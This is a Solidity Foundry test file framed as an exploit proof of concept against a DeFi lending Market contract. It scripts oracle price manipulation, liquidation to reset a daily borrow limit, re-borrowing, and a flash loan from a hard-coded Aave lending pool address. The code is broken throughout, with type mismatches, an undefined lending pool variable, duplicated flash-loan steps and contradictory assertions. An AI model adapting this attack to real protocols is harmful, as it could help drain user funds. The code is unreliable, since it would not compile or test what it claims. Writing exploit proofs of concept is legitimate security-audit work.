// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Market.sol";
import "../src/Oracle.sol";
import "../src/BorrowController.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/Test.sol";
import "@aave/protocol-v2/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "@aave/protocol-v2/contracts/interfaces/ILendingPool.sol";

// Constants for magic numbers
uint constant GOVERNOR_ADDRESS = 0x1;
uint constant LENDER_ADDRESS = 0x2;
uint constant PAUSE_GUARDIAN_ADDRESS = 0x3;
uint constant ESCROW_IMPLEMENTATION_ADDRESS = 0x4;
uint constant DOLA_BORROWING_RIGHTS_ADDRESS = 0x5;
uint constant COLLATERAL_TOKEN_ADDRESS = 0x6;
uint constant ORACLE_ADDRESS = 0x7;
uint constant COLLATERAL_FACTOR_BPS = 9000;
uint constant REPLENISHMENT_INCENTIVE_BPS = 100;
uint constant LIQUIDATION_INCENTIVE_BPS = 150;
bool constant CALL_ON_DEPOSIT_CALLBACK = true;

// Contract ExploitPoCTest is designed to test potential exploits in the Market contract.
contract ExploitPoCTest is Test {
    Market market;
    Oracle oracle;
    BorrowController borrowController;
    IERC20 collateral;

    // Setup
    function setUp() public {
        // Mock addresses and parameters for the Market contract setup
        address gov = GOVERNOR_ADDRESS;
        address lender = LENDER_ADDRESS;
        address pauseGuardian = PAUSE_GUARDIAN_ADDRESS;
        address escrowImplementation = ESCROW_IMPLEMENTATION_ADDRESS;
        IDolaBorrowingRights dbr = IDolaBorrowingRights(DOLA_BORROWING_RIGHTS_ADDRESS);
        IERC20 collateralToken = IERC20(COLLATERAL_TOKEN_ADDRESS);
        IOracle oracleAddress = IOracle(ORACLE_ADDRESS);
        uint collateralFactorBps = COLLATERAL_FACTOR_BPS;
        uint replenishmentIncentiveBps = REPLENISHMENT_INCENTIVE_BPS;
        uint liquidationIncentiveBps = LIQUIDATION_INCENTIVE_BPS;
        bool callOnDepositCallback = CALL_ON_DEPOSIT_CALLBACK;

        // Instantiating the Market contract with predefined mock parameters
        market = new Market(
            gov, 
            lender, 
            pauseGuardian, 
            escrowImplementation, 
            dbr, 
            collateralToken, 
            oracleAddress, 
            collateralFactorBps, 
            replenishmentIncentiveBps, 
            liquidationIncentiveBps, 
            callOnDepositCallback
        );

        // Additional setup for Oracle or other components can be added here if necessary
        oracle = Oracle(oracleAddress);
        borrowController = new BorrowController(market);
        collateral = collateralToken;
    }

    // Test
    function testNormalBorrowLiquidate() public {
        // Simulating a normal user interaction with the market
        vm.prank(address(1));
        market.setDailyBorrowLimit(100 ether);
        oracle.setPrice("DOLA", 2000 ether); // Setting DOLA price to $2000

        // Borrowing under normal conditions to test system behavior
        vm.prank(address(2));
        market.borrow("DOLA", 50 ether); // Borrow 50 DOLA
        assertEq(market.borrowAllowed("DOLA", address(2)), 50 ether);

        // Testing liquidation process and checking if limits are respected
        vm.prank(address(3));
        market.liquidate(address(2));
        assertEq(market.borrowAllowed("DOLA", address(3)), 50 ether); // Should still be 50 ether left under limit
    }

    function testExploitSequence() public {
        // Artificially manipulating the price in Oracle to simulate an attack vector
        vm.prank(address(0)); // Using the admin address to set the price
        oracle.setPrice("DOLA", 1000 ether); // Set DOLA price to $1000
        assertEq(oracle.getPrice("DOLA"), 1000 ether, "Oracle price not set correctly");

        // Borrowing near the daily limit to test system limits and responses
        vm.startPrank(address(4)); // Start prank as the borrower
        market.setDailyBorrowLimit(100 ether);
        market.borrow("DOLA", 95 ether); // Borrow 95 DOLA
        assertEq(market.borrowAllowed("DOLA", address(4)), 5 ether, "Incorrect borrow allowance after borrowing 95 DOLA");
        assertEq(market.dailyBorrows("DOLA"), 95 ether, "Daily borrows not updated correctly after borrowing 95 DOLA");
        vm.stopPrank(); // Stop prank as the borrower

        // Simulating an attack by calling Market.liquidate() and checking system's response
        vm.startPrank(address(5)); // Start prank as the attacker
        market.liquidate(address(4));
        assertEq(market.dailyBorrows("DOLA"), 0 ether, "Daily borrows not reset to 0 after liquidation");
        vm.stopPrank(); // Stop prank as the attacker

        // Testing if another borrow is allowed post-exploit, checking for system vulnerabilities
        vm.startPrank(address(6)); // Start prank as another borrower exploiting the situation
        market.borrow("DOLA", 100 ether); // Attempt to borrow again after exploit
        assertEq(market.borrowAllowed("DOLA", address(6)), 0 ether, "Borrow allowance should be 0 after borrowing 100 DOLA post-exploit");
        assertEq(market.dailyBorrows("DOLA"), 100 ether, "Daily borrows should be 100 DOLA after borrowing post-exploit");
        vm.stopPrank(); // Stop prank as the exploiter
    }

    function testSustainedPriceManipulation() public {
        // Day 1: Artificially set a HIGH price in Oracle 
        vm.warp(block.timestamp + 1 days); // Fast forward one day
        oracle.setPrice("DOLA", 100000 ether); // Exaggerated price
        assertEq(oracle.getPrice("DOLA"), 100000 ether, "Oracle price not set correctly on Day 1");

        // Borrow near the limit based on inflated price
        vm.prank(address(2));
        market.borrow("DOLA", 95 ether); // Borrow 95 DOLA
        assertEq(market.borrowAllowed("DOLA", address(2)), 5 ether, "Incorrect borrow allowance after borrowing 95 DOLA");
        assertEq(market.dailyBorrows("DOLA"), 95 ether, "Daily borrows not updated correctly after borrowing 95 DOLA");

        // Day 2: Maintain HIGH price
        vm.warp(block.timestamp + 1 days); // Fast forward another day
        oracle.setPrice("DOLA", 110000 ether); // Keep the manipulation going
        assertEq(oracle.getPrice("DOLA"), 110000 ether, "Oracle price not maintained correctly on Day 2");

        // Liquidate and re-borrow to test system response
        vm.prank(address(3));
        uint liquidationReward = market.liquidate(address(2));
        uint expectedReward = calculateNormalLiquidationReward(95 ether, oracle.getPrice("DOLA")); // Use oracle price for the calculation
        assertGt(liquidationReward, expectedReward); // Demonstrate the excessive reward
        vm.prank(address(2));
        market.borrow("DOLA", 50 ether); // Attempt to re-borrow
        assertEq(market.borrowAllowed("DOLA", address(2)), 50 ether, "Borrowing limit should be enforced correctly.");
        assertEq(market.dailyBorrows("DOLA"), 50 ether, "Daily borrows not updated correctly after re-borrowing");
    }

    // Helper
    function calculateNormalLiquidationReward(uint borrowedAmount, uint marketPrice) internal pure returns (uint) {
        // Assuming a liquidation incentive of 10%
        return borrowedAmount * marketPrice * 10 / 100;
    }

    function testFlashLoanPriceManipulationExploit() public {
        // Setup
        uint256 flashLoanAmount = 1000 ether;  // Set a reasonable amount

        // Step 1: Take out the flash loan
        _takeFlashLoan(flashLoanAmount);  

        // Step 2: Manipulate oracle price
        uint256 originalPrice = oracle.getPrice(address(collateral)); 
        _manipulateOraclePrice(address(collateral), originalPrice * 2);

        // Step 3: Borrow close to the daily limit
        uint256 dailyLimit = borrowController.dailyLimits(address(market));
        _borrowUpToLimit(dailyLimit);  

        // Step 4: Trigger liquidation, reset the daily limit
        _triggerLiquidation(); 

        // Step 5: Re-borrow immediately 
        _reBorrowAfterLiquidation(dailyLimit);

        // Step 6: Attempt over-borrowing based on inflated price
        uint256 expectedWithdrawal = dailyLimit * 2; // Assume collateral price doubled
        assertEq(_withdrawOverborrowedFunds(expectedWithdrawal), expectedWithdrawal);

        // Step 7: Repay the flash loan with the initial amount
        _repayFlashLoan(flashLoanAmount);
    }

    function _takeFlashLoan(uint256 amount) internal {
        // Address of the Aave Lending Pool Addresses Provider
        // This address may change and should be verified from the Aave documentation or their official GitHub repository
        address lendingPoolAddressesProviderAddress = 0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5;

        // Get the lending pool address
        ILendingPoolAddressesProvider provider = ILendingPoolAddressesProvider(lendingPoolAddressesProviderAddress);
        ILendingPool lendingPool = ILendingPool(provider.getLendingPool());

        // Define the asset you want to borrow, for example DAI
        address asset = address(collateral);

        // Amount to borrow
        uint256 flashLoanAmount = amount;

        // Execute the flash loan
        address[] memory assets = new address[](1);
        assets[0] = asset;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashLoanAmount;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0; // 0 = no debt incurred (unsecured flash loan)

        // Pass this contract address as the receiver of the flash loan
        address onBehalfOf = address(this);

        // The params can be used to pass arbitrary data to the flash loan receiver contract
        bytes memory params = ""; // Additional data if needed

        // 0 for no debt, 1 for stable, 2 for variable
        uint16 referralCode = 0; // Referral code if applicable

        lendingPool.flashLoan(
            address(this), // Receiver of the flash loan
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    )
        external
        returns (bool)
    {
        // Logic to handle borrowed assets
        uint256 flashLoanAmount = amounts[0];

        // Step 2: Manipulate oracle price
        uint256 originalPrice = oracle.getPrice(address(collateral));
        _manipulateOraclePrice(address(collateral), originalPrice * 2);

        // Step 3: Borrow close to the daily limit
        uint256 dailyLimit = borrowController.dailyLimits(address(market));
        _borrowUpToLimit(dailyLimit);

        // Step 4: Trigger liquidation, reset the daily limit
        _triggerLiquidation();

        // Step 5: Re-borrow immediately
        _reBorrowAfterLiquidation(dailyLimit);

        // Step 6: Attempt over-borrowing based on inflated price
        uint256 expectedWithdrawal = dailyLimit * 2; // Assume collateral price doubled
        assertEq(_withdrawOverborrowedFunds(expectedWithdrawal), expectedWithdrawal);

        // Repay the flash loan
        for (uint i = 0; i < assets.length; i++) {
            uint amountOwing = amounts[i] + premiums[i];
            IERC20(assets[i]).approve(address(lendingPool), amountOwing);
        }

        return true;
    }

    function _manipulateOraclePrice(address asset, uint256 newPrice) internal {
        // Code to manipulate the oracle price of the specified asset
        // Implement the logic to manipulate the oracle price
        // For example, you can use a library like Chainlink's PriceFeed library
        // or implement a custom oracle price manipulation mechanism
        oracle.setPrice(asset, newPrice);
    }

    function _borrowUpToLimit(uint256 limit) internal {
        // Code to borrow up to the specified daily limit
        vm.prank(address(this));
        market.borrow("DOLA", limit);
    }

    function _triggerLiquidation() internal {
        // Code to trigger a liquidation of the attacker's position
        vm.prank(address(this));
        market.liquidate(address(this));
    }

    function _reBorrowAfterLiquidation(uint256 limit) internal {
        // Code to re-borrow the same inflated amount immediately after liquidation
        vm.prank(address(this));
        market.borrow("DOLA", limit);
    }

    function _withdrawOverborrowedFunds(uint256 expectedWithdrawal) internal returns (uint256) {
        // Code to withdraw the over-borrowed funds using the inflated oracle price or miscalculated withdrawal limits
        uint256 withdrawnAmount = market.withdraw(address(collateral), expectedWithdrawal);
        return withdrawnAmount;
    }

    function _repayFlashLoan(uint256 amount) internal {
        // Code to repay the initial flash loan
        vm.prank(address(this));
        market.repay(address(collateral), amount);
    }
}
